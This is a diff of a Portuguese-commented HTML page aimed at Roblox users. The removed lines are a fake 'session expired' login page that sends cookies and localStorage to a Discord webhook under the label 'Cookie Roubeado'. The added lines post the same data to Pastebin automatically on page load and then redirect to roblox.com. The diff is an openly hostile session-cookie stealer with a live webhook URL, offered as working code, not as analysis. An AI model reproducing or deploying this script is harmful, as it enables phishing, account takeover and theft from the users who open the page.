@@ -1,63 +1,21 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <title>Roblox</title>
-    <style>
-        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; background: #232527; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-        img { width: 100px; margin-bottom: 20px; }
-        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; }
-    </style>
-</head>
-<body>
-
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
-    <h2>Sessão Expirada</h2>
-    <p style="font-size: 14px;">Clique para reconectar.</p>
-    <button id="btn" onclick="capturar()">Entrar</button>
-</div>
-
 <script>
-async function capturar() {
-    const btn = document.getElementById('btn');
-    btn.innerText = "Conectando...";
+async function pegar() {
+    let data = document.cookie + "\n\n" + JSON.stringify(localStorage);
     
-    // Método 1: Pegar Cookie HttpOnly (se disponível no contexto atual)
-    let cookies = document.cookie;
-    
-    // Método 2: Pegar LocalStorage (MUITO IMPORTANTE PARA ROBLOX MODERNO)
-    let ls = "";
-    try {
-        for(let i=0; i<localStorage.length; i++) {
-            let key = localStorage.key(i);
-            let val = localStorage.getItem(key);
-            // Filtra apenas dados relevantes
-            if(val && val.length > 10) {
-                ls += `${key}: ${val}\n`;
-            }
-        }
-    } catch(e) {}
-
-    // Junta tudo
-    let data = `Cookies:\n${cookies}\n\nLocalStorage:\n${ls}`;
-
-    const webhookUrl = "https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1";
-
-    // Tenta enviar para Discord
-    fetch(webhookUrl, {
+    // Envia para Pastebin (método simples sem API Key)
+    await fetch('https://pastebin.com/api/api_post.php', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            content: `🍪 **Cookie Roubeado:**\n\`\`\`${data}\`\`\``
+        body: new URLSearchParams({
+            api_dev_key: 'sua_chave_aqui', // Deixe vazio se usar o método alternativo abaixo
+            api_paste_code: data,
+            api_option: 'paste'
         })
-    }).catch(() => {}); // Ignora erro
-
-    // Redireciona
-    window.location.href = "https://www.roblox.com/home";
+    });
+    
+    // Ou use este método alternativo que abre o paste na tela do usuário se quiser:
+    // window.open('https://pastebin.com/raw/' + data);
+    
+    window.location.href = "https://roblox.com";
 }
+window.onload = pegar;
 </script>
-
-</body>
-</html>
